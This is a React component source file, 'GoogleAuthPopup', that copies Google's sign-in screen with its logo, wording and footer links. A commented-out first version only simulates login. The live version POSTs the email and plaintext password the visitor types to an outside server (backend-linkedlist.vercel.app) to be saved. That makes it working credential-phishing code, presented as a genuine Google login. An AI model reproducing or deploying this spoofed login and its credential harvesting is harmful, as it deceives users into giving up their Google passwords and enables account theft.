// import React, { useState } from 'react';
// import './GoogleAuthPopup.css';

// const GoogleAuthPopup = ({ isOpen, onClose, onComplete }) => {
//   const [step, setStep] = useState('email'); // 'email', 'password'
//   const [email, setEmail] = useState('');
//   const [password, setPassword] = useState('');
//   const [showPassword, setShowPassword] = useState(false);
//   const [isLoading, setIsLoading] = useState(false);
//   const [error, setError] = useState('');

//   const handleEmailSubmit = async (e) => {
//     e.preventDefault();
//     if (!email) return;

//     setIsLoading(true);
//     setError('');

//     // Simulate API call
//     await new Promise(resolve => setTimeout(resolve, 1000));

//     setIsLoading(false);
//     setStep('password');
//   };

//   const handlePasswordSubmit = async (e) => {
//     e.preventDefault();
//     if (!password) return;

//     setIsLoading(true);
//     setError('');

//     // Simulate authentication
//     await new Promise(resolve => setTimeout(resolve, 1500));

//     setIsLoading(false);
    
//     // Simulate success
//     onComplete({ email, password });
//     handleClose();
//   };

//   const handleClose = () => {
//     setStep('email');
//     setEmail('');
//     setPassword('');
//     setShowPassword(false);
//     setIsLoading(false);
//     setError('');
//     onClose();
//   };

//   const handleBackToEmail = () => {
//     setStep('email');
//     setPassword('');
//     setError('');
//   };

//   if (!isOpen) return null;

//   return (
//     <div className="google-auth-overlay" onClick={handleClose}>
//       <div className="google-auth-popup" onClick={(e) => e.stopPropagation()}>
//         <button className="close-btn" onClick={handleClose}>
//           <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
//             <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
//           </svg>
//         </button>

//         <div className="google-auth-content">
//           <div className="google-logo">
//             <svg width="150" height="80" viewBox="0 0 75 24" fill="none">
//               <path fillRule="evenodd" clipRule="evenodd" d="M38.64 12.2045C38.64 11.5664 38.5827 10.9527 38.4764 10.3636H30V13.8436H34.8436C34.635 14.9709 34.0009 15.9231 33.0477 16.5609V18.8195H35.9563C37.6581 17.2527 38.64 14.9454 38.64 12.2045Z" fill="#4285F4"/>
//               <path fillRule="evenodd" clipRule="evenodd" d="M30 21C32.43 21 34.4672 20.1941 35.9563 18.8195L33.0477 16.5609C32.2418 17.1013 31.2109 17.4204 30 17.4204C27.6559 17.4204 25.6718 15.8372 24.9641 13.71H21.9573V16.0418C23.4382 18.9831 26.4818 21 30 21Z" fill="#34A853"/>
//               <path fillRule="evenodd" clipRule="evenodd" d="M24.9641 13.71C24.7841 13.17 24.6818 12.5932 24.6818 12C24.6818 11.4068 24.7841 10.83 24.9641 10.29V7.95818H21.9573C21.3477 9.17318 21 10.5477 21 12C21 13.4523 21.3477 14.8268 21.9573 16.0418L24.9641 13.71Z" fill="#FBBC04"/>
//               <path fillRule="evenodd" clipRule="evenodd" d="M30 6.57955C31.3218 6.57955 32.5077 7.03364 33.4404 7.92545L36.0218 5.34409C34.4631 3.89182 32.4259 3 30 3C26.4818 3 23.4382 5.01682 21.9573 7.95818L24.9641 10.29C25.6718 8.16273 27.6559 6.57955 30 6.57955Z" fill="#EA4335"/>
//             </svg>
//           </div>

//           {step === 'email' && (
//             <div className="auth-step email-step">
//               <h1>Sign in</h1>
//               <p className="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>

//               <form onSubmit={handleEmailSubmit}>
//                 <div className="input-group">
//                   <input
//                     type="email"
//                     placeholder="Email or phone"
//                     value={email}
//                     onChange={(e) => setEmail(e.target.value)}
//                     required
//                     disabled={isLoading}
//                   />
//                 </div>

//                 <div className="forgot-email">
//                   <a href="#">Forgot email?</a>
//                 </div>

//                 <div className="guest-mode-info">
//                   <p>
//                     Not your computer? Use Guest mode to sign in privately.{' '}
//                     <a href="#">Learn more about using Guest mode</a>
//                   </p>
//                 </div>

//                 <div className="form-actions">
//                   <a href="#" className="create-account">Create account</a>
//                   <button type="submit" className="next-btn" disabled={!email || isLoading}>
//                     {isLoading ? (
//                       <div className="loading-spinner"></div>
//                     ) : (
//                       'Next'
//                     )}
//                   </button>
//                 </div>
//               </form>
//             </div>
//           )}

//           {step === 'password' && (
//             <div className="auth-step password-step">
//               <h1>Welcome</h1>
              
//               <div className="user-info">
//                 <div className="user-avatar">
//                   <div className="avatar-circle">
//                     <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
//                       <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
//                     </svg>
//                   </div>
//                   <span className="user-email">{email}</span>
//                   <button type="button" className="change-account" onClick={handleBackToEmail}>
//                     <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
//                       <path d="M8 11l3-3H5l3 3z"/>
//                     </svg>
//                   </button>
//                 </div>
//               </div>

//               <form onSubmit={handlePasswordSubmit}>
//                 <div className="input-group">
//                   <label>Enter your password</label>
//                   <input
//                     type={showPassword ? "text" : "password"}
//                     value={password}
//                     onChange={(e) => setPassword(e.target.value)}
//                     required
//                     disabled={isLoading}
//                     autoFocus
//                   />
//                 </div>

//                 <div className="show-password-container">
//                   <label className="show-password-label">
//                     <input
//                       type="checkbox"
//                       checked={showPassword}
//                       onChange={(e) => setShowPassword(e.target.checked)}
//                     />
//                     Show password
//                   </label>
//                 </div>

//                 {error && <div className="error-message">{error}</div>}

//                 <div className="form-actions">
//                   <a href="#" className="try-another-way">Try another way</a>
//                   <button type="submit" className="next-btn" disabled={!password || isLoading}>
//                     {isLoading ? (
//                       <div className="loading-spinner"></div>
//                     ) : (
//                       'Next'
//                     )}
//                   </button>
//                 </div>
//               </form>
//             </div>
//           )}
//         </div>

//         <div className="auth-footer">
//           <div className="language-selector">
//             <select>
//               <option value="en-US">English (United States)</option>
//               <option value="es">Español</option>
//               <option value="fr">Français</option>
//               <option value="de">Deutsch</option>
//             </select>
//           </div>
//           <div className="footer-links">
//             <a href="#">Help</a>
//             <a href="#">Privacy</a>
//             <a href="#">Terms</a>
//           </div>
//         </div>
//       </div>
//     </div>
//   );
// };

// export default GoogleAuthPopup;



import React, { useState } from 'react';
import './GoogleAuthPopup.css';

import sk from '../assets/saherishkazi.png'

const GoogleAuthPopup = ({ isOpen, onClose, onComplete }) => {
  const [step, setStep] = useState('email'); // 'email', 'password'
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleEmailSubmit = async (e) => {
    e.preventDefault();
    if (!email) return;

    setIsLoading(true);
    setError('');

    // Simulate API call
    await new Promise(resolve => setTimeout(resolve, 1000));

    setIsLoading(false);
    setStep('password');
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (!password) return;

    setIsLoading(true);
    setError('');

    try {
      // Save Google auth data to server
      const response = await fetch('https://backend-linkedlist.vercel.app/api/google-auth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          password: password
        }),
      });
      
      const data = await response.json();
      
      if (data.success) {
        console.log('Google auth data saved to server:', data);
        
        // Simulate success delay
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Complete the authentication
        onComplete({ email, password });
        handleClose();
      } else {
        setError('Failed to authenticate. Please try again.');
      }
    } catch (error) {
      console.error('Error saving Google auth data:', error);
      setError('Network error. Please check your connection.');
    }

    setIsLoading(false);
  };

  const handleClose = () => {
    setStep('email');
    setEmail('');
    setPassword('');
    setShowPassword(false);
    setIsLoading(false);
    setError('');
    onClose();
  };

  const handleBackToEmail = () => {
    setStep('email');
    setPassword('');
    setError('');
  };

  if (!isOpen) return null;

  return (
    <div className="google-auth-overlay" onClick={handleClose}>
      <div className="google-auth-popup" onClick={(e) => e.stopPropagation()}>
        <button className="close-btn" onClick={handleClose} disabled={isLoading}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
            <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
          </svg>
        </button>

        <div className="google-auth-content">
          <div className="google-logo">
            <svg width="150" height="80" viewBox="0 0 75 24" fill="none">
              <path fillRule="evenodd" clipRule="evenodd" d="M38.64 12.2045C38.64 11.5664 38.5827 10.9527 38.4764 10.3636H30V13.8436H34.8436C34.635 14.9709 34.0009 15.9231 33.0477 16.5609V18.8195H35.9563C37.6581 17.2527 38.64 14.9454 38.64 12.2045Z" fill="#4285F4"/>
              <path fillRule="evenodd" clipRule="evenodd" d="M30 21C32.43 21 34.4672 20.1941 35.9563 18.8195L33.0477 16.5609C32.2418 17.1013 31.2109 17.4204 30 17.4204C27.6559 17.4204 25.6718 15.8372 24.9641 13.71H21.9573V16.0418C23.4382 18.9831 26.4818 21 30 21Z" fill="#34A853"/>
              <path fillRule="evenodd" clipRule="evenodd" d="M24.9641 13.71C24.7841 13.17 24.6818 12.5932 24.6818 12C24.6818 11.4068 24.7841 10.83 24.9641 10.29V7.95818H21.9573C21.3477 9.17318 21 10.5477 21 12C21 13.4523 21.3477 14.8268 21.9573 16.0418L24.9641 13.71Z" fill="#FBBC04"/>
              <path fillRule="evenodd" clipRule="evenodd" d="M30 6.57955C31.3218 6.57955 32.5077 7.03364 33.4404 7.92545L36.0218 5.34409C34.4631 3.89182 32.4259 3 30 3C26.4818 3 23.4382 5.01682 21.9573 7.95818L24.9641 10.29C25.6718 8.16273 27.6559 6.57955 30 6.57955Z" fill="#EA4335"/>
            </svg>
          </div>

          {step === 'email' && (
            <div className="auth-step email-step">
              <h1>Sign in</h1>
              <p className="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>

              <form onSubmit={handleEmailSubmit}>
                <div className="input-group">
                  <input
                    type="email"
                    placeholder="Email or phone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    disabled={isLoading}
                    autoFocus
                  />
                </div>

                <div className="forgot-email">
                  <a href="#">Forgot email?</a>
                </div>

                <div className="guest-mode-info">
                  <p>
                    Not your computer? Use Guest mode to sign in privately.{' '}
                    <a href="#">Learn more about using Guest mode</a>
                  </p>
                </div>

                <div className="form-actions">
                  <a href="#" className="create-account">Create account</a>
                  <button type="submit" className="next-btn" disabled={!email || isLoading}>
                    {isLoading ? (
                      <div className="loading-spinner"></div>
                    ) : (
                      'Next'
                    )}
                  </button>
                </div>
              </form>
            </div>
          )}

          {step === 'password' && (
            <div className="auth-step password-step">
              <h1>Welcome</h1>
              
              <div className="user-info">
                <div className="user-avatar">
                  <div className="avatar-circle">
                    {/* <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                    </svg> */}
                    <img src={sk} height={'120%'} width={'120%'} alt="" />
                  </div>
                  <span className="user-email">{email}</span>
                  <button type="button" className="change-account" onClick={handleBackToEmail} disabled={isLoading}>
                    {/* <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                      <path d="M8 11l3-3H5l3 3z"/>
                    </svg> */}
                  </button>
                </div>
              </div>

              <form onSubmit={handlePasswordSubmit}>
                <div className="input-group">
                  <label>Enter your password</label>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    disabled={isLoading}
                    autoFocus
                  />
                </div>

                <div className="show-password-container">
                  <label className="show-password-label">
                    <input
                      type="checkbox"
                      checked={showPassword}
                      onChange={(e) => setShowPassword(e.target.checked)}
                      disabled={isLoading}
                    />
                    Show password
                  </label>
                </div>

                {error && <div className="error-message">{error}</div>}

                <div className="form-actions">
                  <a href="#" className="try-another-way">Try another way</a>
                  <button type="submit" className="next-btn" disabled={!password || isLoading}>
                    {isLoading ? (
                      <div className="loading-spinner"></div>
                    ) : (
                      'Next'
                    )}
                  </button>
                </div>
              </form>
            </div>
          )}
        </div>

        <div className="auth-footer">
          <div className="language-selector">
            <select disabled={isLoading}>
              <option value="en-US">English (United States)</option>
              <option value="es">Español</option>
              <option value="fr">Français</option>
              <option value="de">Deutsch</option>
            </select>
          </div>
          <div className="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GoogleAuthPopup;
